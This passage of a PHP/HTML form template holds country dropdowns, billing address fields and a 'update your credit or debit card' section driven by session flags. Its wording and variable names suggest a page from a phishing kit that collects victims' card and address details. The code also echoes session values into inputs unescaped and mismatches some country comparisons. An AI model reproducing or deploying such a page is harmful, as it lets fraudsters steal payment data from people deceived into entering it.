<option value="Saint Kitts and Nevis" <?php if($_SESSION['_count3s_']=="Saint Kitts and Nevis"){ echo 'selected="selected"';}?> >Saint Kitts and Nevis</option> 
<option value="Saint Lucia" <?php if($_SESSION['_count3s_']=="Saint Lucia"){ echo 'selected="selected"';}?> >Saint Lucia</option> 
<option value="Saint Pierre and Miquelon" <?php if($_SESSION['_count3s_']=="Saint Pierre and Miquelon"){ echo 'selected="selected"';}?> >Saint Pierre and Miquelon</option> 
<option value="Saint Vincent and The Grenadines" <?php if($_SESSION['_count3s_']=="Saint Vincent and The Grenadines"){ echo 'selected="selected"';}?> >Saint Vincent and The Grenadines</option> 
<option value="Samoa" <?php if($_SESSION['_count3s_']=="Samoa"){ echo 'selected="selected"';}?> >Samoa</option> 
<option value="San Marino" <?php if($_SESSION['_count3s_']=="San Marino"){ echo 'selected="selected"';}?> >San Marino</option> 
<option value="Sao Tome and Principe" <?php if($_SESSION['_count3s_']=="Sao Tome and Principe"){ echo 'selected="selected"';}?> >Sao Tome and Principe</option> 
<option value="Saudi Arabia" <?php if($_SESSION['_count3s_']=="Saudi Arabia"){ echo 'selected="selected"';}?> >Saudi Arabia</option> 
<option value="Senegal" <?php if($_SESSION['_count3s_']=="Senegal"){ echo 'selected="selected"';}?> >Senegal</option> 
<option value="Serbia and Montenegro" <?php if($_SESSION['_count3s_']=="Serbia and Montenegro"){ echo 'selected="selected"';}?> >Serbia and Montenegro</option> 
<option value="Seychelles" <?php if($_SESSION['_count3s_']=="Seychelles"){ echo 'selected="selected"';}?> >Seychelles</option> 
<option value="Sierra Leone" <?php if($_SESSION['_count3s_']=="Sierra Leone"){ echo 'selected="selected"';}?> >Sierra Leone</option> 
<option value="Singapore" <?php if($_SESSION['_count3s_']=="Singapore"){ echo 'selected="selected"';}?> >Singapore</option> 
<option value="Slovakia" <?php if($_SESSION['_count3s_']=="Slovakia"){ echo 'selected="selected"';}?> >Slovakia</option> 
<option value="Slovenia" <?php if($_SESSION['_count3s_']=="Slovenia"){ echo 'selected="selected"';}?> >Slovenia</option> 
<option value="Solomon Islands" <?php if($_SESSION['_count3s_']=="Solomon Islands"){ echo 'selected="selected"';}?> >Solomon Islands</option> 
<option value="Somalia" <?php if($_SESSION['_count3s_']=="Somalia"){ echo 'selected="selected"';}?> >Somalia</option> 
<option value="South Africa" <?php if($_SESSION['_count3s_']=="South Africa"){ echo 'selected="selected"';}?> >South Africa</option> 
<option value="South Georgia and The South Sandwich Islands" <?php if($_SESSION['_count3s_']=="South Georgia and The South Sandwich Islands"){ echo 'selected="selected"';}?> >South Georgia and The South Sandwich Islands</option> 
<option value="Spain" <?php if($_SESSION['_count3s_']=="Spain"){ echo 'selected="selected"';}?> >Spain</option> 
<option value="Sri Lanka" <?php if($_SESSION['_count3s_']=="Sri Lanka"){ echo 'selected="selected"';}?> >Sri Lanka</option> 
<option value="Sudan" <?php if($_SESSION['_count3s_']=="Sudan"){ echo 'selected="selected"';}?> >Sudan</option> 
<option value="Suriname" <?php if($_SESSION['_count3s_']=="Suriname"){ echo 'selected="selected"';}?> >Suriname</option> 
<option value="Svalbard and Jan Mayen" <?php if($_SESSION['_count3s_']=="Svalbard and Jan Mayen"){ echo 'selected="selected"';}?> >Svalbard and Jan Mayen</option> 
<option value="Swaziland" <?php if($_SESSION['_count3s_']=="Swaziland"){ echo 'selected="selected"';}?> >Swaziland</option> 
<option value="Sweden" <?php if($_SESSION['_count3s_']=="Sweden"){ echo 'selected="selected"';}?> >Sweden</option> 
<option value="Switzerland" <?php if($_SESSION['_count3s_']=="Switzerland"){ echo 'selected="selected"';}?> >Switzerland</option> 
<option value="Syrian Arab Republic" <?php if($_SESSION['_count3s_']=="Syrian Arab Republic"){ echo 'selected="selected"';}?> >Syrian Arab Republic</option> 
<option value="Taiwan, Province of China" <?php if($_SESSION['_count3s_']=="Taiwan, Province of China"){ echo 'selected="selected"';}?> >Taiwan, Province of China</option> 
<option value="Tajikistan" <?php if($_SESSION['_count3s_']=="Tajikistan"){ echo 'selected="selected"';}?> >Tajikistan</option> 
<option value="Tanzania, United Republic of" <?php if($_SESSION['_count3s_']=="Tanzania, United Republic of"){ echo 'selected="selected"';}?> >Tanzania, United Republic of</option> 
<option value="Thailand" <?php if($_SESSION['_count3s_']=="Thailand"){ echo 'selected="selected"';}?> >Thailand</option> 
<option value="Timor-leste" <?php if($_SESSION['_count3s_']=="Timor-leste"){ echo 'selected="selected"';}?> >Timor-leste</option> 
<option value="Togo" <?php if($_SESSION['_count3s_']=="Togo"){ echo 'selected="selected"';}?> >Togo</option> 
<option value="Tokelau" <?php if($_SESSION['_count3s_']=="Tokelau"){ echo 'selected="selected"';}?> >Tokelau</option> 
<option value="Tonga" <?php if($_SESSION['_count3s_']=="Tonga"){ echo 'selected="selected"';}?> >Tonga</option> 
<option value="Trinidad and Tobago" <?php if($_SESSION['_count3s_']=="Trinidad and Tobago"){ echo 'selected="selected"';}?> >Trinidad and Tobago</option> 
<option value="Tunisia" <?php if($_SESSION['_count3s_']=="Tunisia"){ echo 'selected="selected"';}?> >Tunisia</option> 
<option value="Turkey" <?php if($_SESSION['_count3s_']=="Turkey"){ echo 'selected="selected"';}?> >Turkey</option> 
<option value="Turkmenistan" <?php if($_SESSION['_count3s_']=="Turkmenistan"){ echo 'selected="selected"';}?> >Turkmenistan</option> 
<option value="Turks and Caicos Islands" <?php if($_SESSION['_count3s_']=="Turks and Caicos Islands"){ echo 'selected="selected"';}?> >Turks and Caicos Islands</option> 
<option value="Tuvalu" <?php if($_SESSION['_count3s_']=="Tuvalu"){ echo 'selected="selected"';}?> >Tuvalu</option> 
<option value="Uganda" <?php if($_SESSION['_count3s_']=="Uganda"){ echo 'selected="selected"';}?> >Uganda</option> 
<option value="Ukraine" <?php if($_SESSION['_count3s_']=="Ukraine"){ echo 'selected="selected"';}?> >Ukraine</option> 
<option value="United Arab Emirates" <?php if($_SESSION['_count3s_']=="United Arab Emirates"){ echo 'selected="selected"';}?> >United Arab Emirates</option> 
<option value="United Kingdom" <?php if($_SESSION['_count3s_']=="United Kingdom"){ echo 'selected="selected"';}?> >United Kingdom</option> 
<option value="United States" <?php if($_SESSION['_count3s_']=="United States"){ echo 'selected="selected"';}?> >United States</option> 
<option value="United States Minor Outlying Islands" <?php if($_SESSION['_count3s_']=="United States Minor Outlying Islands"){ echo 'selected="selected"';}?> >United States Minor Outlying Islands</option> 
<option value="Uruguay" <?php if($_SESSION['_count3s_']=="Uruguay"){ echo 'selected="selected"';}?> >Uruguay</option> 
<option value="Uzbekistan <?php if($_SESSION['_count3s_']=="Uzbekistan"){ echo 'selected="selected"';}?> ">Uzbekistan</option> 
<option value="Vanuatu" <?php if($_SESSION['_count3s_']=="Vanuatu"){ echo 'selected="selected"';}?> >Vanuatu</option> 
<option value="Venezuela" <?php if($_SESSION['_count3s_']=="Venezuela"){ echo 'selected="selected"';}?> >Venezuela</option> 
<option value="Vietnam" <?php if($_SESSION['_count3s_']=="Vietnam"){ echo 'selected="selected"';}?> >Vietnam</option> 
<option value="Virgin Islands, British" <?php if($_SESSION['_count3s_']=="Virgin Islands, British"){ echo 'selected="selected"';}?> >Virgin Islands, British</option> 
<option value="Virgin Islands, U.S." <?php if($_SESSION['_count3s_']=="Virgin Islands, U.S."){ echo 'selected="selected"';}?> >Virgin Islands, U.S.</option> 
<option value="Wallis and Futuna" <?php if($_SESSION['_count3s_']=="Wallis and Futuna"){ echo 'selected="selected"';}?> >Wallis and Futuna</option> 
<option value="Western Sahara" <?php if($_SESSION['_count3s_']=="Western Sahara"){ echo 'selected="selected"';}?> >Western Sahara</option> 
<option value="Yemen" <?php if($_SESSION['_count3s_']=="Yemen"){ echo 'selected="selected"';}?> >Yemen</option> 
<option value="Zambia" <?php if($_SESSION['_count3s_']=="Zambia"){ echo 'selected="selected"';}?> >Zambia</option> 
<option value="Zimbabwe" <?php if($_SESSION['_count3s_']=="Zimbabwe"){ echo 'selected="selected"';}?> >Zimbabwe</option>
</select>


</div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="city"><?php echo $CITY_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium" name="city" id="city" value="<?php if(isset($_SESSION['_city_'])){ echo $_SESSION['_city_'];} ?>" required /></div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="state"><?php echo $STATE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium" name="state" id="state" value="<?php if(isset($_SESSION['_state_'])){ echo $_SESSION['_state_'];} ?>" required /></div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="zip"><?php echo $ZIP_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium" name="zip" id="zip" value="<?php if(isset($_SESSION['_zip_'])){ echo $_SESSION['_zip_'];} ?>" required /></div>
          </div>
          
          <div class="control-group">
          <label class="control-label" for="phone"><?php echo $PHONE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-medium" name="phone" id="phone" value="<?php if(isset($_SESSION['_phone_'])){ echo $_SESSION['_phone_']; } ?>" maxlength="17" required pattern="[0-9]{7,17}"  /></div>
          </div>
          
        
         <br>
                 <?php } ?>
        <?php if($_SESSION['billupdatead'] !="on" ) { ?>


         <h3><?php echo $UPDATE_YOUR_CREDIT_OR_DEBIT_CARD_TXT; ?></h3><hr />
        
         <center>
		<?php if($_GET['error'] =="truec"){ ?>
        <div class="alert-error">
        <!--<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>-->
        <i>Please make sure you enter your information correctly.</i>
		</div>
		<br>
        <?php } ?>
        <p style="margin-bottom:20px;"><?php echo $PLEASE_ENTER_YOUR_CREDIT_OR_DEBIT_CARD_DETAILS_CORRECTLY_TXT; ?></p>
        </center>
                 <?php if($_SESSION['billupdatecc'] =="on" ) { ?>
         
<div class="control-group">
          <label class="control-label" for="country"><?php echo $COUNTRY_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-medium" onchange="Frm1country(this.value)" name="country" id="country" required>
<option value="" <?php if($_SESSION['_count3s_']==""){ echo 'selected="selected"';}?> ><?php echo $COUNTRY_TXT; ?></option> 
<option value="Afghanistan" <?php if($_SESSION['_count3s_']=="Afghanistan"){ echo 'selected="selected"';}?> >Afghanistan</option> 
<option value="Albania" <?php if($_SESSION['_count3s_']=="Albania"){ echo 'selected="selected"';}?> >Albania</option> 
<option value="Algeria" <?php if($_SESSION['_count3s_']=="Algeria"){ echo 'selected="selected"';}?> >Algeria</option> 
<option value="American Samoa" <?php if($_SESSION['_count3s_']=="American Samoa"){ echo 'selected="selected"';}?> >American Samoa</option> 
<option value="Andorra" <?php if($_SESSION['_count3s_']=="Andorra"){ echo 'selected="selected"';}?> >Andorra</option> 
<option value="Angola" <?php if($_SESSION['_count3s_']=="Angola"){ echo 'selected="selected"';}?> >Angola</option> 
<option value="Anguilla" <?php if($_SESSION['_count3s_']=="Anguilla"){ echo 'selected="selected"';}?> >Anguilla</option> 
<option value="Antarctica" <?php if($_SESSION['_count3s_']=="Antarctica"){ echo 'selected="selected"';}?> >Antarctica</option> 
<option value="Antigua and Barbuda" <?php if($_SESSION['_count3s_']== "Antigua and Barbuda"){ echo 'selected="selected"';}?> >Antigua and Barbuda</option> 
<option value="Argentina" <?php if($_SESSION['_count3s_']=="Argentina"){ echo 'selected="selected"';}?> >Argentina</option> 
<option value="Armenia" <?php if($_SESSION['_count3s_']=="Armenia"){ echo 'selected="selected"';}?> >Armenia</option> 
<option value="Aruba" <?php if($_SESSION['_count3s_']=="Aruba"){ echo 'selected="selected"';}?> >Aruba</option> 
<option value="Australia" <?php if($_SESSION['_count3s_']=="Australia"){ echo 'selected="selected"';}?> >Australia</option> 
<option value="Austria" <?php if($_SESSION['_count3s_']=="Austria"){ echo 'selected="selected"';}?> >Austria</option> 
<option value="Azerbaijan" <?php if($_SESSION['_count3s_']=="Azerbaijan"){ echo 'selected="selected"';}?> >Azerbaijan</option> 
<option value="Bahamas" <?php if($_SESSION['_count3s_']=="Bahamas"){ echo 'selected="selected"';}?> >Bahamas</option> 
<option value="Bahrain" <?php if($_SESSION['_count3s_']=="Bahrain"){ echo 'selected="selected"';}?> >Bahrain</option> 
<option value="Bangladesh" <?php if($_SESSION['_count3s_']=="Bangladesh"){ echo 'selected="selected"';}?> >Bangladesh</option> 
<option value="Barbados" <?php if($_SESSION['_count3s_']=="Barbados"){ echo 'selected="selected"';}?> >Barbados</option> 
<option value="Belarus" <?php if($_SESSION['_count3s_']=="Belarus"){ echo 'selected="selected"';}?> >Belarus</option> 
<option value="Belgium" <?php if($_SESSION['_count3s_']=="Belgium"){ echo 'selected="selected"';}?> >Belgium</option> 
<option value="Belize" <?php if($_SESSION['_count3s_']=="Belize"){ echo 'selected="selected"';}?> >Belize</option> 
<option value="Benin" <?php if($_SESSION['_count3s_']=="Benin"){ echo 'selected="selected"';}?> >Benin</option> 
<option value="Bermuda" <?php if($_SESSION['_count3s_']=="Bermuda"){ echo 'selected="selected"';}?> >Bermuda</option> 
<option value="Bhutan" <?php if($_SESSION['_count3s_']=="Bhutan"){ echo 'selected="selected"';}?> >Bhutan</option> 
<option value="Bolivia" <?php if($_SESSION['_count3s_']=="Bolivia"){ echo 'selected="selected"';}?> >Bolivia</option> 
<option value="Bosnia and Herzegovina" <?php if($_SESSION['_count3s_']=="United"){ echo 'selected="selected"';}?> >Bosnia and Herzegovina</option> 
<option value="Botswana" <?php if($_SESSION['_count3s_']=="Bosnia and Herzegovina"){ echo 'selected="selected"';}?> >Botswana</option> 
<option value="Bouvet Island" <?php if($_SESSION['_count3s_']=="Bouvet Island"){ echo 'selected="selected"';}?> >Bouvet Island</option> 
<option value="Brazil" <?php if($_SESSION['_count3s_']=="Brazil"){ echo 'selected="selected"';}?> >Brazil</option> 
<option value="British Indian Ocean Territory" <?php if($_SESSION['_count3s_']=="British Indian Ocean Territory"){ echo 'selected="selected"';}?> >British Indian Ocean Territory</option> 
<option value="Brunei Darussalam" <?php if($_SESSION['_count3s_']=="Brunei Darussalam"){ echo 'selected="selected"';}?> >Brunei Darussalam</option> 
<option value="Bulgaria" <?php if($_SESSION['_count3s_']=="Bulgaria"){ echo 'selected="selected"';}?> >Bulgaria</option> 
<option value="Burkina Faso" <?php if($_SESSION['_count3s_']=="Burkina Faso"){ echo 'selected="selected"';}?> >Burkina Faso</option> 
<option value="Burundi" <?php if($_SESSION['_count3s_']=="Burundi"){ echo 'selected="selected"';}?> >Burundi</option> 
<option value="Cambodia" <?php if($_SESSION['_count3s_']=="Cambodia"){ echo 'selected="selected"';}?> >Cambodia</option> 
<option value="Cameroon" <?php if($_SESSION['_count3s_']=="Cameroon"){ echo 'selected="selected"';}?> >Cameroon</option> 
<option value="Canada" <?php if($_SESSION['_count3s_']=="Canada"){ echo 'selected="selected"';}?> >Canada</option> 
<option value="Cape Verde" <?php if($_SESSION['_count3s_']=="Cape Verde"){ echo 'selected="selected"';}?> >Cape Verde</option> 
<option value="Cayman Islands" <?php if($_SESSION['_count3s_']=="Cayman Islands"){ echo 'selected="selected"';}?> >Cayman Islands</option> 
<option value="Central African Republic" <?php if($_SESSION['_count3s_']=="Central African Republic"){ echo 'selected="selected"';}?> >Central African Republic</option> 
<option value="Chad" <?php if($_SESSION['_count3s_']=="Chad"){ echo 'selected="selected"';}?> >Chad</option> 
<option value="Chile" <?php if($_SESSION['_count3s_']=="Chile"){ echo 'selected="selected"';}?> >Chile</option> 
<option value="China" <?php if($_SESSION['_count3s_']=="China"){ echo 'selected="selected"';}?> >China</option> 
<option value="Christmas Island" <?php if($_SESSION['_count3s_']=="Christmas Island"){ echo 'selected="selected"';}?> >Christmas Island</option> 
<option value="Cocos (Keeling) Islands" <?php if($_SESSION['_count3s_']=="Cocos (Keeling) Islands"){ echo 'selected="selected"';}?> >Cocos (Keeling) Islands</option> 
<option value="Colombia" <?php if($_SESSION['_count3s_']=="Colombia"){ echo 'selected="selected"';}?> >Colombia</option> 
<option value="Comoros" <?php if($_SESSION['_count3s_']=="Comoros"){ echo 'selected="selected"';}?> >Comoros</option> 
<option value="Congo" <?php if($_SESSION['_count3s_']=="Congo"){ echo 'selected="selected"';}?> >Congo</option> 
<option value="Congo, The Democratic Republic of The" <?php if($_SESSION['_count3s_']=="Congo, The Democratic Republic of The"){ echo 'selected="selected"';}?> >Congo, The Democratic Republic of The</option> 
<option value="Cook Islands" <?php if($_SESSION['_count3s_']=="Cook Islands"){ echo 'selected="selected"';}?> >Cook Islands</option> 
<option value="Costa Rica" <?php if($_SESSION['_count3s_']=="Costa Rica"){ echo 'selected="selected"';}?> >Costa Rica</option> 
<option value="Cote D`ivoire" <?php if($_SESSION['_count3s_']=="Cote D`ivoire"){ echo 'selected="selected"';}?> >Cote D'ivoire</option> 
<option value="Croatia" <?php if($_SESSION['_count3s_']=="Croatia"){ echo 'selected="selected"';}?> >Croatia</option> 
<option value="Cuba" <?php if($_SESSION['_count3s_']=="Cuba"){ echo 'selected="selected"';}?> >Cuba</option> 
<option value="Cyprus" <?php if($_SESSION['_count3s_']=="Cyprus"){ echo 'selected="selected"';}?> >Cyprus</option> 
<option value="Czech Republic" <?php if($_SESSION['_count3s_']=="Czech Republic"){ echo 'selected="selected"';}?> >Czech Republic</option> 
<option value="Denmark" <?php if($_SESSION['_count3s_']=="Denmark"){ echo 'selected="selected"';}?> >Denmark</option> 
<option value="Djibouti" <?php if($_SESSION['_count3s_']=="Djibouti"){ echo 'selected="selected"';}?> >Djibouti</option> 
<option value="Dominica" <?php if($_SESSION['_count3s_']=="Dominica"){ echo 'selected="selected"';}?> >Dominica</option> 
<option value="Dominican Republic" <?php if($_SESSION['_count3s_']=="Dominican Republic"){ echo 'selected="selected"';}?> >Dominican Republic</option> 
<option value="Ecuador" <?php if($_SESSION['_count3s_']=="Ecuador"){ echo 'selected="selected"';}?> >Ecuador</option> 
<option value="Egypt" <?php if($_SESSION['_count3s_']=="Egypt"){ echo 'selected="selected"';}?> >Egypt</option> 
<option value="El Salvador" <?php if($_SESSION['_count3s_']=="El Salvador"){ echo 'selected="selected"';}?> >El Salvador</option> 
<option value="Equatorial Guinea" <?php if($_SESSION['_count3s_']=="Equatorial Guinea"){ echo 'selected="selected"';}?> >Equatorial Guinea</option> 
<option value="Eritrea" <?php if($_SESSION['_count3s_']=="Eritrea"){ echo 'selected="selected"';}?> >Eritrea</option> 
<option value="Estonia" <?php if($_SESSION['_count3s_']=="Estonia"){ echo 'selected="selected"';}?> >Estonia</option> 
<option value="Ethiopia" <?php if($_SESSION['_count3s_']=="Ethiopia"){ echo 'selected="selected"';}?> >Ethiopia</option> 
<option value="Falkland Islands (Malvinas)" <?php if($_SESSION['_count3s_']=="Falkland Islands (Malvinas)"){ echo 'selected="selected"';}?> >Falkland Islands (Malvinas)</option> 
<option value="Faroe Islands" <?php if($_SESSION['_count3s_']=="Faroe Islands"){ echo 'selected="selected"';}?> >Faroe Islands</option> 
<option value="Fiji" <?php if($_SESSION['_count3s_']=="Fiji"){ echo 'selected="selected"';}?> >Fiji</option> 
<option value="Finland" <?php if($_SESSION['_count3s_']=="Finland"){ echo 'selected="selected"';}?> >Finland</option> 
<option value="France" <?php if($_SESSION['_count3s_']=="France"){ echo 'selected="selected"';}?> >France</option> 
<option value="French Guiana" <?php if($_SESSION['_count3s_']=="French Guiana"){ echo 'selected="selected"';}?> >French Guiana</option> 
<option value="French Polynesia" <?php if($_SESSION['_count3s_']=="French Polynesia"){ echo 'selected="selected"';}?> >French Polynesia</option> 
<option value="French Southern Territories" <?php if($_SESSION['_count3s_']=="French Southern Territories"){ echo 'selected="selected"';}?> >French Southern Territories</option> 
<option value="Gabon" <?php if($_SESSION['_count3s_']=="Gabon"){ echo 'selected="selected"';}?> >Gabon</option> 
<option value="Gambia" <?php if($_SESSION['_count3s_']=="Gambia"){ echo 'selected="selected"';}?> >Gambia</option> 
<option value="Georgia" <?php if($_SESSION['_count3s_']=="Georgia"){ echo 'selected="selected"';}?> >Georgia</option> 
<option value="Germany" <?php if($_SESSION['_count3s_']=="Germany"){ echo 'selected="selected"';}?> >Germany</option> 
<option value="Ghana" <?php if($_SESSION['_count3s_']=="Ghana"){ echo 'selected="selected"';}?> >Ghana</option> 
<option value="Gibraltar" <?php if($_SESSION['_count3s_']=="Gibraltar"){ echo 'selected="selected"';}?> >Gibraltar</option> 
<option value="Greece" <?php if($_SESSION['_count3s_']=="Greece"){ echo 'selected="selected"';}?> >Greece</option> 
<option value="Greenland" <?php if($_SESSION['_count3s_']=="Greenland"){ echo 'selected="selected"';}?> >Greenland</option> 
<option value="Grenada" <?php if($_SESSION['_count3s_']=="Grenada"){ echo 'selected="selected"';}?> >Grenada</option> 
<option value="Guadeloupe" <?php if($_SESSION['_count3s_']=="Guadeloupe"){ echo 'selected="selected"';}?> >Guadeloupe</option> 
<option value="Guam" <?php if($_SESSION['_count3s_']=="Guam"){ echo 'selected="selected"';}?> >Guam</option> 
<option value="Guatemala" <?php if($_SESSION['_count3s_']=="Guatemala"){ echo 'selected="selected"';}?> >Guatemala</option> 
<option value="Guinea" <?php if($_SESSION['_count3s_']=="Guinea"){ echo 'selected="selected"';}?> >Guinea</option> 
<option value="Guinea-bissau" <?php if($_SESSION['_count3s_']=="Guinea-bissau"){ echo 'selected="selected"';}?> >Guinea-bissau</option> 
<option value="Guyana" <?php if($_SESSION['_count3s_']=="Guyana"){ echo 'selected="selected"';}?> >Guyana</option> 
<option value="Haiti" <?php if($_SESSION['_count3s_']=="Haiti"){ echo 'selected="selected"';}?> >Haiti</option> 
<option value="Heard Island and Mcdonald Islands" <?php if($_SESSION['_count3s_']=="Heard Island and Mcdonald Islands"){ echo 'selected="selected"';}?> >Heard Island and Mcdonald Islands</option> 
<option value="Holy See (Vatican City State)" <?php if($_SESSION['_count3s_']=="Holy See (Vatican City State)"){ echo 'selected="selected"';}?> >Holy See (Vatican City State)</option> 
<option value="Honduras" <?php if($_SESSION['_count3s_']=="Honduras"){ echo 'selected="selected"';}?> >Honduras</option> 
<option value="Hong Kong" <?php if($_SESSION['_count3s_']=="Hong Kong"){ echo 'selected="selected"';}?> >Hong Kong</option> 
<option value="Hungary" <?php if($_SESSION['_count3s_']=="Hungary"){ echo 'selected="selected"';}?> >Hungary</option> 
<option value="Iceland" <?php if($_SESSION['_count3s_']=="Iceland"){ echo 'selected="selected"';}?> >Iceland</option> 
<option value="India" <?php if($_SESSION['_count3s_']=="India"){ echo 'selected="selected"';}?> >India</option> 
<option value="Indonesia" <?php if($_SESSION['_count3s_']=="Indonesia"){ echo 'selected="selected"';}?> >Indonesia</option> 
<option value="Iran, Islamic Republic of" <?php if($_SESSION['_count3s_']=="Iran, Islamic Republic of"){ echo 'selected="selected"';}?> >Iran, Islamic Republic of</option> 
<option value="Iraq" <?php if($_SESSION['_count3s_']=="Iraq"){ echo 'selected="selected"';}?> >Iraq</option> 
<option value="Ireland" <?php if($_SESSION['_count3s_']=="Ireland"){ echo 'selected="selected"';}?> >Ireland</option> 
<option value="Israel" <?php if($_SESSION['_count3s_']=="Israel"){ echo 'selected="selected"';}?> >Israel</option> 
<option value="Italy" <?php if($_SESSION['_count3s_']=="Italy"){ echo 'selected="selected"';}?> >Italy</option> 
<option value="Jamaica" <?php if($_SESSION['_count3s_']=="Jamaica"){ echo 'selected="selected"';}?> >Jamaica</option> 
<option value="Japan" <?php if($_SESSION['_count3s_']=="Japan"){ echo 'selected="selected"';}?> >Japan</option> 
<option value="Jordan" <?php if($_SESSION['_count3s_']=="Jordan"){ echo 'selected="selected"';}?> >Jordan</option> 
<option value="Kazakhstan" <?php if($_SESSION['_count3s_']=="Kazakhstan"){ echo 'selected="selected"';}?> >Kazakhstan</option> 
<option value="Kenya" <?php if($_SESSION['_count3s_']=="Kenya"){ echo 'selected="selected"';}?> >Kenya</option> 
<option value="Kiribati" <?php if($_SESSION['_count3s_']=="Kiribati"){ echo 'selected="selected"';}?> >Kiribati</option> 
<option value="Korea, Democratic Peoples Republic of" <?php if($_SESSION['_count3s_']=="Korea, Democratic People's Republic of"){ echo 'selected="selected"';}?> >Korea, Democratic People's Republic of</option> 
<option value="Korea, Republic of" <?php if($_SESSION['_count3s_']=="Korea, Republic of"){ echo 'selected="selected"';}?> >Korea, Republic of</option> 
<option value="Kuwait" <?php if($_SESSION['_count3s_']=="Kuwait"){ echo 'selected="selected"';}?> >Kuwait</option> 
<option value="Kyrgyzstan" <?php if($_SESSION['_count3s_']=="Kyrgyzstan"){ echo 'selected="selected"';}?> >Kyrgyzstan</option> 
<option value="Lao Peoples Democratic Republic" <?php if($_SESSION['_count3s_']=="Lao People's Democratic Republic"){ echo 'selected="selected"';}?> >Lao People's Democratic Republic</option> 
<option value="Latvia" <?php if($_SESSION['_count3s_']=="Latvia"){ echo 'selected="selected"';}?> >Latvia</option> 
<option value="Lebanon" <?php if($_SESSION['_count3s_']=="Lebanon"){ echo 'selected="selected"';}?> >Lebanon</option> 
<option value="Lesotho" <?php if($_SESSION['_count3s_']=="Lesotho"){ echo 'selected="selected"';}?> >Lesotho</option> 
<option value="Liberia" <?php if($_SESSION['_count3s_']=="Liberia"){ echo 'selected="selected"';}?> >Liberia</option> 
<option value="Libyan Arab Jamahiriya" <?php if($_SESSION['_count3s_']=="Libyan Arab Jamahiriya"){ echo 'selected="selected"';}?> >Libyan Arab Jamahiriya</option> 
<option value="Liechtenstein" <?php if($_SESSION['_count3s_']=="Liechtenstein"){ echo 'selected="selected"';}?> >Liechtenstein</option> 
<option value="Lithuania" <?php if($_SESSION['_count3s_']=="Lithuania"){ echo 'selected="selected"';}?> >Lithuania</option> 
<option value="Luxembourg" <?php if($_SESSION['_count3s_']=="Luxembourg"){ echo 'selected="selected"';}?> >Luxembourg</option> 
<option value="Macao" <?php if($_SESSION['_count3s_']=="Macao"){ echo 'selected="selected"';}?> >Macao</option> 
<option value="Macedonia, The Former Yugoslav Republic of" <?php if($_SESSION['_count3s_']=="Macedonia, The Former Yugoslav Republic of"){ echo 'selected="selected"';}?> >Macedonia, The Former Yugoslav Republic of</option> 
<option value="Madagascar" <?php if($_SESSION['_count3s_']=="Madagascar"){ echo 'selected="selected"';}?> >Madagascar</option> 
<option value="Malawi" <?php if($_SESSION['_count3s_']=="Malawi"){ echo 'selected="selected"';}?> >Malawi</option> 
<option value="Malaysia" <?php if($_SESSION['_count3s_']=="Malaysia"){ echo 'selected="selected"';}?> >Malaysia</option> 
<option value="Maldives" <?php if($_SESSION['_count3s_']=="Maldives"){ echo 'selected="selected"';}?> >Maldives</option> 
<option value="Mali" <?php if($_SESSION['_count3s_']=="Mali"){ echo 'selected="selected"';}?> >Mali</option> 
<option value="Malta" <?php if($_SESSION['_count3s_']=="Malta"){ echo 'selected="selected"';}?> >Malta</option> 
<option value="Marshall Islands" <?php if($_SESSION['_count3s_']=="Marshall Islands"){ echo 'selected="selected"';}?> >Marshall Islands</option> 
<option value="Martinique" <?php if($_SESSION['_count3s_']=="Martinique"){ echo 'selected="selected"';}?> >Martinique</option> 
<option value="Mauritania" <?php if($_SESSION['_count3s_']=="Mauritania"){ echo 'selected="selected"';}?> >Mauritania</option> 
<option value="Mauritius" <?php if($_SESSION['_count3s_']=="Mauritius"){ echo 'selected="selected"';}?> >Mauritius</option> 
<option value="Mayotte" <?php if($_SESSION['_count3s_']=="Mayotte"){ echo 'selected="selected"';}?> >Mayotte</option> 
<option value="Mexico" <?php if($_SESSION['_count3s_']=="Mexico"){ echo 'selected="selected"';}?> >Mexico</option> 
<option value="Micronesia, Federated States of" <?php if($_SESSION['_count3s_']=="Micronesia, Federated States of"){ echo 'selected="selected"';}?> >Micronesia, Federated States of</option> 
<option value="Moldova, Republic of" <?php if($_SESSION['_count3s_']=="Moldova, Republic of"){ echo 'selected="selected"';}?> >Moldova, Republic of</option> 
<option value="Monaco" <?php if($_SESSION['_count3s_']=="Monaco"){ echo 'selected="selected"';}?> >Monaco</option> 
<option value="Mongolia" <?php if($_SESSION['_count3s_']=="Mongolia"){ echo 'selected="selected"';}?> >Mongolia</option> 
<option value="Montserrat" <?php if($_SESSION['_count3s_']=="Montserrat"){ echo 'selected="selected"';}?> >Montserrat</option> 
<option value="Morocco" <?php if($_SESSION['_count3s_']=="Morocco"){ echo 'selected="selected"';}?> >Morocco</option> 
<option value="Mozambique" <?php if($_SESSION['_count3s_']=="Mozambique"){ echo 'selected="selected"';}?> >Mozambique</option> 
<option value="Myanmar" <?php if($_SESSION['_count3s_']=="Myanmar"){ echo 'selected="selected"';}?> >Myanmar</option> 
<option value="Namibia" <?php if($_SESSION['_count3s_']=="Namibia"){ echo 'selected="selected"';}?> >Namibia</option> 
<option value="Nauru" <?php if($_SESSION['_count3s_']=="Nauru"){ echo 'selected="selected"';}?> >Nauru</option> 
<option value="Nepal" <?php if($_SESSION['_count3s_']=="Nepal"){ echo 'selected="selected"';}?> >Nepal</option> 
<option value="Netherlands" <?php if($_SESSION['_count3s_']=="Netherlands"){ echo 'selected="selected"';}?> >Netherlands</option> 
<option value="Netherlands Antilles" <?php if($_SESSION['_count3s_']=="Netherlands Antilles"){ echo 'selected="selected"';}?> >Netherlands Antilles</option> 
<option value="New Caledonia" <?php if($_SESSION['_count3s_']=="New Caledonia"){ echo 'selected="selected"';}?> >New Caledonia</option> 
<option value="New Zealand" <?php if($_SESSION['_count3s_']=="New Zealand"){ echo 'selected="selected"';}?> >New Zealand</option> 
<option value="Nicaragua" <?php if($_SESSION['_count3s_']=="Nicaragua"){ echo 'selected="selected"';}?> >Nicaragua</option> 
<option value="Niger" <?php if($_SESSION['_count3s_']=="Niger"){ echo 'selected="selected"';}?> >Niger</option> 
